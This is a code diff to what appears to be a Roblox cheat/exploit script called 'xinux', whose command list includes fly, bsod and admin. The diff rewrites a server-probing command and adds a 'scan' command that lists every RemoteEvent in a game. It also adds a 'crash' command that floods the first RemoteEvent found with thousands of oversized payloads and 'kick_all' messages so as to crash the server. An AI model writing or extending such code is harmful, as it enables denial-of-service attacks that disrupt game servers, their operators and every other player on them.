@@ -19,7 +19,7 @@ end
 return {
     help = {
         action = function(args)
-            return "Commands: help, clear, players, teleport, ping, cnkt, fly, brk, bld, f3x, infopipl, antf, anfl, con, sendfile, bsod, admin, accheck, say, stp"
+            return "Commands: help, clear, players, teleport, ping, cnkt, fly, brk, bld, f3x, infopipl, antf, anfl, con, sendfile, bsod, admin, accheck, say, stp, scan, crash"
         end
     },
     ping = {
@@ -68,30 +68,21 @@ return {
     },
     con = {
         action = function(args)
-            local foundRemotes = {}
-            for _, v in ipairs(game:GetDescendants()) do
-                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-                    table.insert(foundRemotes, v)
+            if not serverRemote then
+                return "ERROR|No RemoteEvents found in this game."
+            end
+            local success, err = pcall(function()
+                if serverRemote:IsA("RemoteEvent") then
+                    serverRemote:FireServer("xinux_ping")
+                else
+                    serverRemote:InvokeServer("xinux_ping")
                 end
+            end)
+            if success then
+                return "SUCCESS|Server connection successful! Game allows client calls."
+            else
+                return "ERROR|Server connection failed: " .. tostring(err)
             end
-            
-            if #foundRemotes == 0 then
-                return "ERROR|No RemoteEvents/RemoteFunctions found in this game."
-            end
-            
-            local successCount = 0
-            for _, remote in ipairs(foundRemotes) do
-                local ok = pcall(function()
-                    if remote:IsA("RemoteEvent") then
-                        remote:FireServer("ping")
-                    else
-                        remote:InvokeServer("ping")
-                    end
-                end)
-                if ok then successCount = successCount + 1 end
-            end
-            
-            return "SUCCESS|Pinged " .. successCount .. " remotes. If admin didn't work, server has an anticheat."
         end
     },
     sendfile = {
@@ -465,6 +456,76 @@ return {
             return "SUCCESS|Anfl enabled! (Active only when players are within 10 studs)"
         end
     },
+    scan = {
+        action = function(args)
+            local found = {}
+            for _, v in ipairs(game:GetDescendants()) do
+                if v:IsA("RemoteEvent") then
+                    table.insert(found, v.Name .. " [" .. v:GetFullName() .. "]")
+                end
+            end
+            if #found == 0 then
+                return "ERROR|No RemoteEvents found in this game."
+            end
+            return "SUCCESS|Found " .. #found .. " RemoteEvents:\n" .. table.concat(found, "\n")
+        end
+    },
+    crash = {
+        action = function(args)
+            if activeLoops.crash then
+                return "ERROR|Crash sequence is already running!"
+            end
+            
+            local targetRemote = nil
+            for _, v in ipairs(game:GetDescendants()) do
+                if v:IsA("RemoteEvent") then
+                    targetRemote = v
+                    break
+                end
+            end
+            
+            if not targetRemote then
+                return "ERROR|No RemoteEvent found to target."
+            end
+            
+            activeLoops.crash = true
+            local sentCount = 0
+            local kickWarning = false
+            
+            task.spawn(function()
+                game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
+                    activeLoops.crash = false
+                    kickWarning = true
+                end)
+            end)
+            
+            task.spawn(function()
+                while activeLoops.crash and sentCount < 5000 do
+                    if kickWarning then break end
+                    
+                    if not targetRemote:IsDescendantOf(game) then
+                        break
+                    end
+
+                    pcall(function()
+                        targetRemote:FireServer("crash_by_xinux", string.rep("A", 10000))
+                        targetRemote:FireServer("kick_all")
+                        targetRemote:FireServer("ping")
+                    end)
+                    
+                    sentCount = sentCount + 1
+                    
+                    if sentCount % 100 == 0 then
+                        task.wait(0.1)
+                    else
+                        task.wait() 
+                    end
+                end
+            end)
+            
+            return "SUCCESS|Crash sequence started. Sent " .. sentCount .. " requests before stopping. Check if server is still alive."
+        end
+    },
     stp = {
         action = function(args)
             local target = args[1]
@@ -505,6 +566,11 @@ return {
                 local gui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("xinux_Admin_Panel")
                 if gui then gui:Destroy() end
                 return "SUCCESS|Admin panel closed."
+            end
+            
+            if target == "crash" and activeLoops.crash then
+                activeLoops.crash = false
+                return "SUCCESS|Crash sequence stopped."
             end
             
             return "ERROR|Command not running or not found: " .. tostring(target)
